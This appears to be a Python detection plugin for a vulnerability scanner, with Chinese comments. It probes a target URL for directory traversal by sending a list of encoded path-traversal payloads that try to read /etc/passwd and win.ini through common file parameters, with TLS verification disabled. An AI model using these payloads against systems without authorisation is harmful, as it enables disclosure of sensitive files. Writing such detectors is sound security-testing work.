"""
目录遍历漏洞检测插件

检测路径穿越（Path Traversal）漏洞，尝试读取系统敏感文件。
"""

import requests
import urllib3
from typing import List

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from base import BasePlugin, Target, VulnResult

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class DirectoryTraversalPlugin(BasePlugin):
    """目录遍历漏洞检测插件"""

    name = "directory_traversal"
    description = "检测目录遍历/路径穿越漏洞"
    severity = "high"
    author = "AutoScan"

    # 目录遍历 Payload 及对应的检测关键字
    PAYLOADS = [
        # Linux 系统文件
        ("../../../etc/passwd", ["root:", "/bin/bash", "/bin/sh"]),
        ("....//....//....//etc/passwd", ["root:", "/bin/bash"]),
        ("..%2f..%2f..%2fetc%2fpasswd", ["root:", "/bin/bash"]),
        ("..%252f..%252f..%252fetc%252fpasswd", ["root:", "/bin/bash"]),
        # Windows 系统文件
        ("..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]"]),
        ("..%5c..%5c..%5cwindows%5cwin.ini", ["[extensions]", "[fonts]"]),
    ]

    def check(self, target: Target) -> List[VulnResult]:
        """执行目录遍历检测"""
        results = []

        if not target.url:
            return results

        base_url = target.url.rstrip("/")

        for payload, keywords in self.PAYLOADS:
            try:
                # 测试常见的文件参数名
                for param in ["file", "path", "page", "document", "filename", "include"]:
                    test_url = f"{base_url}/?{param}={payload}"
                    resp = requests.get(test_url, timeout=10, verify=False)
                    body = resp.text

                    for keyword in keywords:
                        if keyword in body:
                            results.append(self.make_result(
                                name="目录遍历漏洞",
                                description=f"在 {base_url} 通过参数 '{param}' 检测到路径穿越",
                                url=test_url,
                                payload=payload,
                                evidence=f"响应中包含系统文件内容: {keyword}",
                                solution="禁止用户输入中包含路径分隔符，使用白名单验证文件路径",
                            ))
                            return results
            except requests.RequestException:
                continue

        return results
